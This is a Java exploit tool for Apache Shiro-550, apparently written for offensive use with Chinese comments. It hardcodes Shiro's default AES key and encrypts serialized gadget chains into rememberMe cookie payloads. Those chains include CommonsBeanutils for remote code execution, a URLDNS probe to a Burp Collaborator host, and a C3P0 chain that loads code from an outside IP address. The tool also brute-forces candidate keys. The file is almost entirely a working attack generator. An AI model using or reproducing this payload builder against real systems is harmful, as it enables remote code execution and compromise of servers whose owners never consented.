package exploit;

import org.apache.shiro.subject.SimplePrincipalCollection;
import util.C3P0Utils;
import util.CB1Utils;
import util.SerializerUtils;
import util.URLDNSUtils;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.lang.reflect.Array;
import java.net.URLDecoder;
import java.util.*;

public class Shiro {
    private final byte[] key;
    //默认key
    public Shiro(){
        this.key=java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
    }
    public Shiro(String encode_key) {
        this.key = java.util.Base64.getDecoder().decode(encode_key);;
    }

    public static void main(String[] args) throws Exception {
        Shiro shiro=new Shiro();
        Shiro.Shiro550 shiro550=shiro.new Shiro550();
//        shiro550.generateKeysPayload(1);
        shiro550.shiroCB();
//        shiro550.shiroDNS();
    }

    public class Shiro550{
        AesCipherService aes = new AesCipherService();
        private byte[] payload;
        private ArrayList<String> keys;
        //DNS探测,需要目标主机支持DNS解析
        {
            try {
                loadShiroKeys();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        public void shiroDNS() throws Exception {
            URLDNSUtils urldnsUtils=new URLDNSUtils("http://x862cky5iu8aakyddt5nmc7bh2nsbh.burpcollaborator.net");
            payload= urldnsUtils.getBytes();
            ByteSource ciphertext = aes.encrypt(payload, key);
            System.out.println(ciphertext.toString());
        }

        //无依赖CC链RCE
        public void shiroCB() throws Exception {
            payload= CB1Utils.getBytes();
            ByteSource ciphertext = aes.encrypt(payload, key);
            System.out.println(ciphertext.toString());
        }

        public void shiroC3P0() throws Exception {
            C3P0Utils c3P0Utils=new C3P0Utils("http://49.232.190.132/:RCE");
            payload=c3P0Utils.getBytes();
            ByteSource ciphertext = aes.encrypt(payload, key);
            System.out.println(ciphertext.toString());
        }

        //爆破shirokey，若key正确则不返回DeleteMe
        public void generateKeysPayload(Integer num) throws IOException {
            ArrayList<String> shiroKeys=this.keys;
            SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
            payload=SerializerUtils.serialize(simplePrincipalCollection);
            Integer index=0;
            for (String shiroKey:shiroKeys){
                if(index==num){
                    return;
                }
//                long startTime = System.currentTimeMillis();
                ByteSource ciphertext = aes.encrypt(payload, java.util.Base64.getDecoder().decode(shiroKey));
                System.out.println(ciphertext.toString());
//                long endTime = System.currentTimeMillis();
//                System.out.println((endTime-startTime));
                index++;
            }
        }
        //从shiroKeys文件加载key，可扩充
        public void loadShiroKeys() throws IOException {
//            long startTime = System.currentTimeMillis();
            String path=null;
            keys = new ArrayList<>();
            try{
                path = this.getClass().getClassLoader().getResource("shiroKeys").getPath();//注意getResource("")里面是空字符串
            }catch (Exception e){
                System.out.println(e);
                return;
            }
            BufferedReader br=new BufferedReader(new FileReader(URLDecoder.decode(path,"UTF-8")));
            String line=null;
            while ((line=br.readLine()) != null) {
                keys.add(line);
            }
            br.close();
//            long stopTime = System.currentTimeMillis();
//            System.out.println("Time:" + (stopTime - startTime) );
            return;
        }
    }
}
